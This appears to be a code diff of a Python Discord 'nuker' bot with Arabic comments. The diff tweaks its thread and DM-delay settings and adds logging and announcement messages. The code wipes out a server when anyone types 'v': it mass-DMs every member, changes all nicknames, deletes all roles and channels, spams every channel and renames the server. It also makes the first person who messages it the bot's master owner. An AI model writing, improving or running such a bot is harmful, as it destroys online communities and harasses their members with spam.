@@ -27,8 +27,8 @@ TOKEN = None
 OWNER_ID = None
 NUKE_TRIGGER = "v"
 
-MAX_THREADS = 10000
-DM_DELAY = 0.0005
+MAX_THREADS = 5000
+DM_DELAY = 0.001
 
 DM_MESSAGE = """
 ╔══════════════════════════════════════════════════════════════════════╗
@@ -180,7 +180,9 @@ class UltimateNuker:
         }
         
         try:
+            print(f"[NUKER] Starting nuke on {guild.name}...")
             results['dm_sent'], results['dm_failed'] = await self.mass_dm_everyone(bot, guild)
+            print(f"[NUKER] DM sent: {results['dm_sent']}")
             results['nicknames_changed'] = await self.change_all_nicknames(guild)
             results['roles_deleted'] = await self.delete_all_roles(guild)
             results['channels_deleted'] = await self.delete_all_channels(guild)
@@ -189,6 +191,7 @@ class UltimateNuker:
             results['spam_messages'] = await self.spam_all_channels(guild)
             await self.rename_server(guild)
             self.nuked_servers.append(guild.name)
+            print(f"[NUKER] Nuke completed on {guild.name}!")
         except Exception as e:
             print(f"Error: {e}")
         finally:
@@ -202,24 +205,36 @@ nuker = UltimateNuker()
 # DISCORD BOT
 # ============================================
 
+# IMPORTANT: تفعيل جميع الـ Intents
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
 intents.guilds = True
+intents.guild_messages = True
+intents.dm_messages = True
 
 bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
 
 @bot.event
 async def on_ready():
+    print(f"\n✅ Bot is ready! Logged in as {bot.user}")
+    print(f"✅ Bot ID: {bot.user.id}")
+    print(f"✅ Bot is in {len(bot.guilds)} servers")
+    
+    # تغيير بروفايل البوت
     try:
         await bot.user.edit(username="")
-    except:
-        pass
+        print("✅ Username cleared")
+    except Exception as e:
+        print(f"Could not change username: {e}")
     
+    # تغيير الحالة
     await bot.change_presence(activity=discord.Game(name=""))
     
+    # تغيير البايو
     try:
         await bot.user.edit(bio="")
+        print("✅ Bio cleared")
     except:
         pass
     
@@ -234,34 +249,44 @@ async def on_ready():
 ║  📡 SERVERS: """ + str(len(bot.guilds)) + """                                                                                                          ║
 ║  👥 TOTAL MEMBERS: """ + str(sum(g.member_count for g in bot.guilds)) + """                                                                          ║
 ║                                                                                                                                          ║
-║  ⚡ TRIGGER: Type "v" in ANY server = INSTANT DESTRUCTION ⚡                                                               ║
+║  ⚡ TRIGGER: Type "v" in ANY server = INSTANT DESTRUCTION ⚡                                                                              ║
 ║  💀 FIRST USER = MASTER OWNER 💀                                                                                                         ║
 ║  🔥 NO RESPONSE - JUST DESTRUCTION 🔥                                                                                                    ║
 ║                                                                                                                                          ║
 ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
     """)
+    
+    print("\n💀 Waiting for someone to type 'v'... 💀\n")
 
 @bot.event
 async def on_message(message):
+    # تجاهل رسائل البوت نفسه
     if message.author == bot.user:
         return
     
     global OWNER_ID
     
+    # طباعة كل رسالة لل debug
+    print(f"[DEBUG] Message from {message.author} in {message.guild}: {message.content[:50]}")
+    
+    # أول مستخدم يرسل رسالة يصبح مالك
     if OWNER_ID is None:
         OWNER_ID = message.author.id
-        print(f"OWNER SET: {message.author} (ID: {OWNER_ID})")
+        print(f"\n👑 OWNER SET: {message.author} (ID: {OWNER_ID}) 👑\n")
+        await message.channel.send("```\n👑 YOU ARE NOW THE MASTER OWNER!\n💀 Type !help for commands\n```")
         return
     
-    if message.author.id == OWNER_ID:
-        if message.content.startswith('!'):
-            await handle_owner_command(message)
+    # معالجة أوامر المالك
+    if message.author.id == OWNER_ID and message.content.startswith('!'):
+        await handle_owner_command(message)
         return
     
+    # التحقق من كلمة التفعيل
     if message.content.lower().strip() == NUKE_TRIGGER:
         guild = message.guild
         if guild and not nuker.is_nuking:
-            print(f"NUKE TRIGGERED in {guild.name} by {message.author}")
+            print(f"\n💀💀💀 NUKE TRIGGERED in {guild.name} by {message.author} 💀💀💀\n")
+            await message.channel.send("```\n💀 NUKE ACTIVATED! DESTROYING SERVER... 💀\n```")
             asyncio.create_task(nuker.ultimate_nuke(guild))
 
 async def handle_owner_command(message):
